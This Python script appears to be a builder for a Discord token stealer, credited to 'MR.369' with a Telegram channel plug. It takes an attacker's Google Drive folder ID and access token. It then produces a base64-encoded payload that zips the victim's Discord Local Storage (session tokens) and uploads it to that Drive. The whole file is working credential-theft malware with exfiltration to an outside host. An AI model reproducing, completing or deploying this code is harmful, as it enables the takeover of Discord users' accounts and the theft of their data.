from re import X
import os
from colorama import Fore, Back, Style
import time
from zmq import BACKLOG
import base64
import getpass

userr = getpass.getuser()
os.system("cls")
print(Fore.RED+"""
01010100011010000110100101110011011010010111001101101101011110010110011101110101011011100010000100100001
""")
time.sleep(1)

os.system("cls")
print(Fore.GREEN+f"""

                                
                                                  
 @@@@@@   @@@  @@@   @@@@@@   @@@@@@@   @@@  @@@  
@@@@@@@   @@@  @@@  @@@@@@@@  @@@@@@@@  @@@  @@@  
!@@       @@!  @@@  @@!  @@@  @@!  @@@  @@!  !@@  
!@!       !@!  @!@  !@!  @!@  !@!  @!@  !@!  @!!  
!!@@!!    @!@!@!@!  @!@!@!@!  @!@!!@!   @!@@!@!   
 !!@!!!   !!!@!!!!  !!!@!!!!  !!@!@!    !!@!!!    
     !:!  !!:  !!!  !!:  !!!  !!: :!!   !!: :!!   
    !:!   :!:  !:!  :!:  !:!  :!:  !:!  :!:  !:!  
:::: ::   ::   :::  ::   :::  ::   :::   ::  :::  
:: : :     :   : :   :   : :   :   : :   :   :::  

                                        
              Coded by: MR.369

    <<<<<< Telegram = @MR_369_963 >>>>>>
""")

print(Fore.WHITE+"""
369 Enter our Telegram channel to see the tutorial of this tool !!! 369
""")

print(Fore.YELLOW+"""
:)
01010100011010000110
10010111001101101001
011100110110110101111
001011001110111010101
1011100010000100100001
""")
e = input(Fore.CYAN+"*ENTER drive.google > > ")
tjo = input(Fore.CYAN+"*ENTER access_token > > ")
print(Fore.WHITE+"[******************************************************]")

codd=(Fore.BLUE+f"""
import zipfile
import requests
import pandas
import os
import json
import getpass
# enter data !
{"drive , access_token ="+"'"+ e +"'"+"," + "'"+tjo+"'"}


"""
"""
a=os.path.expanduser('~')
# !!!!!!!!!!
user = getpass.getuser()
fantasy_zip = zipfile.ZipFile('file.zip', 'w')
for folder, subfolders, files in os.walk(a+f"\AppData\Roaming\discord\Local Storage"):
    for file in files:
        fantasy_zip.write(os.path.join(folder, file), os.path.relpath(os.path.join(folder,file), 'C:\Stories\Fantasy'), compress_type = zipfile.ZIP_DEFLATED)
fantasy_zip.close()
headers = {"Authorization": f"Bearer {access_token}"}
para = {
    "name": "hack369",
    "parents":[f"{drive}"]
}
files = {
    'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
    'file': open("./file.zip", "rb")
}
r = requests.post(
    "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
    headers=headers,
    files=files
)


""")

o=codd.encode()
encoded_data = base64.b64encode(o)
ppp = encoded_data.decode()

print(ppp)

input(".")